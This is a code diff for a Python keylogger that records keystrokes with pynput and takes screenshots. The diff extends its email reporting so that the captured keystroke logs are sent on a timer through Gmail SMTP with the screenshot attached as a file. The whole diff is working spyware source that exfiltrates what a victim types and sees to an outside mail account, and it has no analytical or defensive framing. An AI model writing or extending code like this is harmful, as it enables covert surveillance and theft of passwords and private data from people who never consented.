@@ -2,6 +2,11 @@ from pynput.keyboard import Listener
 from time import sleep
 import threading
 import smtplib 
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import os
 from datetime import datetime
 from pynput.keyboard import Key
 import mss
@@ -55,11 +60,8 @@ class Kelogger:
       screenshot_file = self.take_screenshot()
 
 
-      email_content = f"{formatted_log}\nScreenshot saved as: {screenshot_file}"
-
       # Send via email
-      self.send_mail(self.email, self.password, email_content)
-
+      self.send_mail(self.email, self.password, formatted_log, screenshot_file)
 
       # View in Terminal
       print(formatted_log)
@@ -73,18 +75,39 @@ class Kelogger:
     self.log = ""
     threading.Timer(self.interval, self.report).start() 
 
-  def send_mail(self, email, password, message):
-      """Send logs via email with proper formatting."""
+  def send_mail(self, email, password, message, attachment_path=None):
+      """Send logs via email with optional screenshot attachment."""
       try:
-          server = smtplib.SMTP("smtp.gmail.com", 587)
+          # Message preparation
+          msg = MIMEMultipart()
+          msg['From'] = email
+          msg['To'] = email
+          msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+
+          # Add Text
+          msg.attach(MIMEText(message, 'plain'))
+
+          # Add attachment (image)
+          if attachment_path and os.path.isfile(attachment_path):
+              with open(attachment_path, 'rb') as attachment:
+                  part = MIMEBase('application', 'octet-stream')
+                  part.set_payload(attachment.read())
+                  encoders.encode_base64(part)
+                  part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
+                  msg.attach(part)
+
+          # Send Message
+          server = smtplib.SMTP('smtp.gmail.com', 587)
           server.starttls()
           server.login(email, password)
-          subject = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
-          email_text = f"Subject: {subject}\nFrom: {email}\nTo: {email}\n\n{message}"
-          server.sendmail(email, email, email_text)
+          server.send_message(msg)
           server.quit()
+
+          print(f"[+] Email sent successfully with attachment: {attachment_path}")
+
       except Exception as e:
-          print(f"Failed to send email: {e}")
+          print(f"[!] Failed to send email: {e}")
+
 
   def start(self):
       # Create a listener that monitors keystrokes
